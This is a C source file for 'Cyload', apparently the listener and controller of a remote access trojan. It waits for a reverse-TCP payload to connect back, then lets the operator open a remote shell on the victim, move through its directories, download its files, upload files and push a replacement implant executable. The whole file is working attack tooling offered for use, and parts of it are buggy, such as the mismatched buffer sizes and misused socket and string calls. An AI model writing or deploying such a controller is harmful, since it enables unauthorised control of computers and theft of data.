#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include "Simple.h"


#ifdef _WIN32 

//WinSock
#include <WinSock2.h>
#pragma comment(lib,"ws2_32.lib")

//Socket
SOCKET Socket, server = INVALID_SOCKET;
WSADATA wsa;
#endif

#ifdef linux

//Define Socket
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

//Socket
int Socket, server;

//Variables
socklen_t len;
struct sockaddr_storage addr;
char ipstr[INET6_ADDRSTRLEN];
int portNum;

#endif

//Define Function
void printDesign(void);
int setupInterface(void);
void clearConsole(void);
int connecttoClient(void);
int exploit(char clientip[20]);
BOOLEAN nanosleep(LONGLONG ns);
void INThandler(int);
DWORD WINAPI readOutput(void);

//Variables For Socket
char address[20] = "127.0.0.1";
int port = 27015;
char targetAddress[20] = "";
struct sockaddr_in service, client;

//Other Variables
char payload[10];
int stage = 0;
int location = 0;

//Variables For Input
char userInput[50];
char *trailingCharacter;
char *splitString;

//Variables For File Operations
char fileBuffer[30];
char reciveCode;

//Variables For Nanotimer
HANDLE timer;
LARGE_INTEGER li;

//Main
void main(void) {

	//Handle CTR C
	signal(SIGINT, INThandler);
	printDesign();

	//Set Up Cyload
	setupInterface();
	
}

//Setup Up Cyload
int setupInterface(void) {

	//Set Location
	location = 0;
	//Get Users Commands
	for (; ;) {

		if (stage == 0) {
			printf("Cyload > ");
		}

		//Payload Setup Stage
		else if (stage == 1) {
			printf("Cyload > %s > ", payload);
		}

		//Get User Input
		fgets(userInput, sizeof(userInput), stdin);

		//Remove Trailing Character
		if (userInput[(strlen(userInput) - 1)] == '\n') {
			userInput[(strlen(userInput) - 1)] = '\0';
		}

		//Clear Screen
		if (strcmp(userInput, "cls") == 0 || strcmp(userInput, "clear") == 0) {
			clearConsole();
			printDesign();
		}

		//Set Variables
		else if (strncmp(userInput, "set ", 4) == 0) {
			//set Address
			if (strncmp(userInput, "set ip  ", 7) == 0) {
				memmove(userInput, userInput + 7, strlen(userInput));
				strcpy_s(address, sizeof(address), userInput);
				printf("\n");
				printf("Set Ip to %s\n", userInput);
				printf("\n");
			}
			//set Port
			else if (strncmp(userInput, "set port ", 9) == 0) {
				memmove(userInput, userInput + 9, strlen(userInput));
				port = atoi(userInput);
				printf("\n");
				printf("Set Port to %d\n", port);
				printf("\n");
			}

			//Set Target IP
			else if (strncmp(userInput, "set targetip  ", 13) == 0) {
				memmove(userInput, userInput + 13, strlen(userInput));
				strcpy_s(targetAddress, sizeof(targetAddress), userInput);
				printf("\n");
				printf("Set targetip to %s\n", userInput);
				printf("\n");
			}
			
			//Command Not Found
			else {
				memmove(userInput, userInput + 4, strlen(userInput));
				printf("\n");
				strtok(userInput, " ", &splitString);
				printf("%s variable not found\n", *splitString);
				printf("\n");
			}

		}

		//Set Payload
		else if (strncmp(userInput, "use ", 4) == 0) {

			//Rev_Tcp Paylaod
			if (strncmp(userInput, "use rev_tcp\0", 12) == 0) {
				strcpy_s(payload, sizeof(payload), "rev_tcp");
				stage = 1;
				printf("\n");
				printf("Set Payload to %s\n", payload);
				printf("\n");
			}
			//Unknown Payload
			else {
				memmove(userInput, userInput + 4, strlen(userInput));
				printf("\n");
				printf("%s payload not found\n", userInput);
				printf("\n");
			}
		}

		//Deselects Payload
		else if (strcmp(userInput, "back") == 0) {
			strcpy_s(payload, sizeof(payload), "");
			stage = 0;
		}

		//Print Variables
		else if (strcmp(userInput, "vars") == 0) {
			printf("\n");
			printf("Varriables:\n");
			printf("\n");
			printf(" Ip:        %s \n", address);
			printf(" Port:      %d \n", port);
			printf(" Payload:   %s \n", payload);
			printf("\n");

		}

		//List Payloads
		else if (strcmp(userInput, "list") == 0) {
			printf("\n");
			printf("Payloads:\n");
			printf("\n");
			printf(" rev_tcp                     Stageless\n");
			printf("\n");
		}

		//Help Screen
		else if (strcmp(userInput, "help") == 0) {
			printf("\n");
			printf("Commands:\n");
			printf("\n");
			printf(" set ip ...                  Sets server ip for listening                 IP:        %s \n", address);
			printf(" set port ...                Sets port for listening                      Port:      %d \n", port);
			printf(" set targetip ...            Sets target ip.                              IP:        %s \n", targetAddress);
			printf(" use ...                     Sets payload to handle                       \n");
			printf(" list                        Lists avaiable payloads                      \n");
			printf(" vars                        Print Out All Variables                      \n");
			printf(" help                        Brings up this screen                        \n");
			printf(" cls or clear                Clears console screen                        \n");
			printf(" back                        Deselects payload                            \n");
			printf(" exit                        Exit                                         \n");
			printf("\n");

		}

		//Exploit
		else if (strcmp(userInput, "exploit") == 0) {
			if (stage == 0) {
				printf("\n");
				printf("Please Select A Payload First\n");
				printf("\n");
			}
			else {

				//Conect To Client
				connecttoClient();

				//Connection Ended
				printf("\n");
				printf("Closed Connection to Host\n");
				printf("\n");

				//Clean Up Socket
				#ifdef _WIN32
					closesocket(server);
					closesocket(Socket);
					WSACleanup();
				#endif

				#ifdef linux
					close(server);
					close(Socket);
				#endif

			}
		}

		//Exit
		else if (strcmp(userInput, "exit") == 0) {
			printf("Exiting...");
			return 0;
		}

		//No Command
		else {
			printf("\n");
			printf("'%s' is not recognized as a command\n", userInput);
			printf("\n");
		}
	}
}

//Connect to Client
int connecttoClient() {

	//Set Location
	location = 1;

	//Initialize Variables For Socket
	service.sin_family = AF_INET;
	service.sin_addr.s_addr = inet_addr(address);
	service.sin_port = htons(port);

	#ifdef _WIN32
		//Initialize WSA
		if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
			return 1;
		}
	#endif

	//Start Socket
	Socket = socket(AF_INET, SOCK_STREAM, 0);

	#ifdef _WIN32
		if (bind(Socket, (SOCKADDR *)(&service), sizeof(service)) == SOCKET_ERROR) {
			printf("\n");
			printf("Failed To Bind Socket...\n");
			printf("Try Changing Ip or Port\n");
			printf("\n");
		}
	#endif

	#ifdef linux
		if (bind(Socket, (struct sockaddr *)(&service), sizeof(service)) < 0) {
			printf("\n");
			printf("Failed To Bind Socket...\n");
			printf("Try Changing Ip or Port\n");
			printf("\n");

		}
	#endif
	//Listen For Connection
	printf("\nListening For Conections on %s\n", address);

	for (; ;) {
		listen(Socket, 3);
		int sizeofaddr = sizeof(struct sockaddr_in);
		server = accept(Socket, (struct sockaddr *)&client, &sizeofaddr);
		#ifdef _WIN32
		if (strlen(targetAddress) > 5) {
			if (strcmp(inet_ntoa(client.sin_addr), targetAddress) != 0) {
				printf("Conection Attempt By %s\n", inet_ntoa(client.sin_addr));
				closesocket(server);
				continue;
			}
		}
		break;
		
		#endif

		#ifdef linux
		len = sizeof addr;
		getpeername(server, (struct sockaddr*)&addr, &len);


		// deal with both IPv4 and IPv6:
		if (addr.ss_family == AF_INET) {
			struct sockaddr_in *server = (struct sockaddr_in *)&addr;
			portNum = ntohs(server->sin_port);
			inet_ntop(AF_INET, &server->sin_addr, ipstr, sizeof ipstr);
		}

		else { // AF_INET6
			struct sockaddr_in6 *server = (struct sockaddr_in6 *)&addr;
			portNum = ntohs(server->sin6_port);
			inet_ntop(AF_INET6, &server->sin6_addr, ipstr, sizeof ipstr);
		}
		if (strlen(targetAddress) > 1 && strcmp(ipstr, targetAddress) == 0) {
			break;
		}
		printf("Attepted Conection By %s", ipstr);
		close(server);
		#endif
	}
	#ifdef _WIN32

	//Connected
	printf("Conected to %s on port %d\n\n", inet_ntoa(client.sin_addr), (int)ntohs(client.sin_port));
	exploit(inet_ntoa(client.sin_addr));

	#endif

	#ifdef linux

	printf("Conected to %s on port %d\n\n", ipstr, portNum);
	exploit(ipstr);

	#endif

	return 0;
}

//Initialize Variables
char Command[200];
int returnsData;
int messageSize;
int buffSize = 100000;
char rawmessage[100010];
char *message;

//Comunicate To Client
int exploit(char clientip[20]) {

	//Set Location
	location = 2;
	message = (char *)malloc(2);
	
	

	for (; ;) {

		//Get User Command
		printf("%s > ", clientip);
		fgets(Command, 512, stdin);
		//Remove Trailing Character
		if (Command[(strlen(Command) - 1)] == '\n') {
			Command[(strlen(Command) - 1)] = '\0';
		}

		//Check If It returns
		returnsData = 0;

		//Close Sockets
		if (strcmp(Command, "exit") == 0) {
			//Disconect
			return 0;
		}

		//Help
		else if (strcmp(Command, "help") == 0) {
			printf("\n");
			printf("Commands:\n");
			printf("\n");
			printf(" shell                       Connect to Shell on Client                   \n");
			printf(" set ...                     Set Variables for Client                     \n");
			printf(" cd                          Prints Client Current Directory              \n");
			printf(" cd ...                      Changes Client Current Directory             \n");
			printf(" upload ...                  Upload File to client                        \n");
			printf(" download ...                Download File from client                    \n");
			printf(" update ...                  Update Payload with New Executable           \n");
			printf(" help                        Brings up this Screen                        \n");
			printf(" cls or clear                Clears Console Screen                        \n");
			printf(" exit                        Disconects from Client                       \n");
			printf("\n");
		}
		
		//Change Upload And Download Directory
		else if (strncmp(Command, "cd ", 2) == 0) {

			//Send Directory
			send(server, Command, strlen(Command) + 1, 0);
			recv(server, rawmessage, buffSize, 0);
			printf("\n%s\n", rawmessage);
		}

		//Upload
		else if (strncmp(Command, "upload ", 7) == 0) {

			//Declare Variables
			char fileName[25];
			char filemessage[100];
			FILE *uploadFile;

			//Get File Name
			memmove(Command, Command + 7, strlen(Command));

			if (strlen(Command) < 1) {
				printf("\n Specify File Loacation \n\n");
				continue;
			}

			//Open File
			fopen_s(&uploadFile, Command, "rb");

			//Check if File Exists
			if (!uploadFile) {
				printf("\nFile Does not Exist\n\n");
				continue;
			}

			//Let User Type File Name
			printf("\nType In New File Name\n");
			fgets(fileName, 25, stdin);
			if (fileName[(strlen(fileName) - 1)] == '\n') {
				fileName[(strlen(fileName) - 1)] = '\0';
			}
			replacechar(Command, '\\', '/');
			printf("\n");

			//Send Start to Client
			strcpy_s(filemessage, sizeof(filemessage), "_Prepare_For_File_Upload_ ");
			strcat_s(filemessage, sizeof(filemessage), fileName);
			send(server, filemessage, strlen(filemessage) + 1, 0);

			int bytesRead = 1;
			

			//Read File
			while (!feof(uploadFile))
			{
				memset(fileBuffer, 0, strlen(fileBuffer));
				bytesRead = fread(fileBuffer, sizeof(fileBuffer), 1, uploadFile);
				send(server, fileBuffer, sizeof(fileBuffer), 0);
				recv(server, reciveCode, 2, 0);
			}

			send(server, "DONE_SEND_", 11, 0);
			printf("Done Uploading...\n\n");
			fclose(uploadFile);


		}

		//Download
		else if (strncmp(Command, "download ", 9) == 0) {

			//Ask For File
			printf("\nPreparing For Download\n");
			memmove(Command, Command + 9, strlen(Command));
			char filemessage[100];
			strcpy_s(filemessage, sizeof(filemessage), "_Prepare_For_Download_ ");
			strcat_s(filemessage, sizeof(filemessage), Command);
			send(server, filemessage, sizeof(filemessage), 0);

			//Get Whether You Can Get File
			messageSize = recv(server, rawmessage, buffSize, 0);
			message = (char *)realloc(message, messageSize + 1);
			strcpy_s(message, messageSize + 1, rawmessage);
			printf("\n%s", message);
			if (strncmp(message, "File Not Found", 14) == 0) {
				continue;
			}

			//New File
			FILE *newfile;
			fopen_s(&newfile, Command, "wb");
			memset(fileBuffer, 0, strlen(fileBuffer));

			if (newfile) {
				//Recive File
				printf("\nDownload In Progress...\n");
				for (; ;) {
					messageSize = recv(server, fileBuffer, sizeof(fileBuffer), 0);
					if (strncmp(fileBuffer, "DONE_SEND_", 10) == 0) {
						break;
					}
					fwrite(fileBuffer, 1, messageSize, newfile);
				}
				printf("\nDownload Complete...\n\n");
				fclose(newfile);
			}
		}

		//Update Payload
		else if (strncmp(Command, "update ", 7) == 0) {

			//Declare Variables
			char filemessage[100];
			FILE *uploadFile;

			//Get File Name
			memmove(Command, Command + 7, strlen(Command));

			if (strlen(Command) < 1) {
				printf("\n Specify File Loacation \n\n");
				continue;
			}

			//Open File
			fopen_s(&uploadFile, Command, "rb");

			//Check if File Exists
			if (!uploadFile) {
				printf("\nFile Does not Exist\n\n");
				continue;
			}

			
			replacechar(Command, '\\', '/');
			printf("\n");

			//Send Start to Client
			send(server, "_Prepare_For_Update_", strlen("_Prepare_For_Update_") + 1, 0);

			int bytesRead = 1;


			//Read File
			while (!feof(uploadFile))
			{
				memset(fileBuffer, 0, strlen(fileBuffer));
				bytesRead = fread(fileBuffer, sizeof(fileBuffer), 1, uploadFile);
				send(server, fileBuffer, sizeof(fileBuffer), 0);
				//printf("%s", fileBuffer);
				recv(server, reciveCode, 2, 0);
			}

			send(server, "DONE_SEND_", 11, 0);
			printf("Done Updating...\nExiting...\n");
			fclose(uploadFile);

			//Exiting
			return 0;


		}
		//Clear Screen
		else if (strcmp(Command, "cls") == 0 || strcmp(Command, "clear") == 0) {
			clearConsole();
		}

		//Connects to Shell
		else if (strcmp(Command, "shell") == 0){
			shell();
		}
		
		//No Command Exists
		else {
			printf("\n\'%s\' is not a recognized command\n\n", Command);
		}

		if (returnsData == 1) {
			messageSize = recv(server, rawmessage, buffSize, 0);
			message = (char *)realloc(message, messageSize + 1);
			strcpy_s(message, messageSize + 1, rawmessage);
			printf("\n%s\n", message);
		}
	}
}

//Shell
int shell(){	

	printf("\n");
	//Tell Client To Create Shell
	send(server, "shell", 6, 0);
	
	//Creates Thread For Listening
	HANDLE thread = CreateThread(NULL, 0, readOutput, NULL, 0, NULL);
	
	//Loops To Get User Command
	for(;;){
		fgets(Command, sizeof(Command), stdin);
		send(server, Command, sizeof(Command), 0);
		if(strncmp(Command,"exit\n",5) == NULL){
			printf("\n");
			TerminateThread(thread, 0);
			break;
		}
	}
}

//Thread For Reading Output
DWORD WINAPI readOutput(void) {
	CHAR chBuf[60];
	
	//Constantly Read
	for (;;)
	{
		memset(chBuf, 0, sizeof(chBuf));
		recv(server, chBuf, 60, 0);
		
				
		//Got Output
		printf("%s", chBuf);
	}
}

//Print Cyload logo
void printDesign(void) {
	printf("\n");
	printf("      ллллллллл  ллллл ллллл ллллл          ллллллл      ллллллллл   лллллллллл  \n");
	printf("     лллАААААлллААллл ААллл ААллл         лллАААААллл   лллАААААллл ААлллААААллл \n");
	printf("    ллл     ААА  ААллл ллл   Аллл        ллл     ААллл Аллл    Аллл  Аллл   ААллл\n");
	printf("   Аллл           ААллллл    Аллл       Аллл      Аллл Аллллллллллл  Аллл    Аллл\n");
	printf("   Аллл            ААллл     Аллл       Аллл      Аллл АлллАААААллл  Аллл    Аллл\n");
	printf("   ААллл     ллл    Аллл     Аллл      лААллл     ллл  Аллл    Аллл  Аллл    ллл \n");
	printf("    ААллллллллл     ллллл    ллллллллллл АААлллллллА   ллллл   ллллл лллллллллл  \n");
	printf("     ААААААААА     ААААА    ААААААААААА    ААААААА    ААААА   ААААА АААААААААА   \n");
	printf("\n");
}

//Clear Screen
void clearConsole(void) {
#ifdef _WIN32
	COORD topLeft = { 0, 0 };
	HANDLE console = GetStdHandle(STD_OUTPUT_HANDLE);
	CONSOLE_SCREEN_BUFFER_INFO screen;
	DWORD written;

	GetConsoleScreenBufferInfo(console, &screen);
	FillConsoleOutputCharacterA(
		console, ' ', screen.dwSize.X * screen.dwSize.Y, topLeft, &written
	);
	FillConsoleOutputAttribute(
		console, FOREGROUND_GREEN | FOREGROUND_RED | FOREGROUND_BLUE,
		screen.dwSize.X * screen.dwSize.Y, topLeft, &written
	);
	SetConsoleCursorPosition(console, topLeft);
#endif
#ifdef _linux
	printf("\033[H\033[J");
#endif

}

//Sleep
BOOLEAN nanosleep(LONGLONG ns) {

	if (!(timer = CreateWaitableTimer(NULL, TRUE, NULL)))
		return FALSE;
	li.QuadPart = -ns;

	if (!SetWaitableTimer(timer, &li, 0, NULL, NULL, FALSE)) {
		CloseHandle(timer);
		return FALSE;
	}
	WaitForSingleObject(timer, INFINITE);
	CloseHandle(timer);
	return TRUE;
}

//Handle CTR C
void INThandler(int sig){
	#ifdef _WIN32
	closesocket(server);
	closesocket(Socket);
	#endif
	#ifdef linux
	close(server);
	close(Socket);
	#endif
	exit(0);
}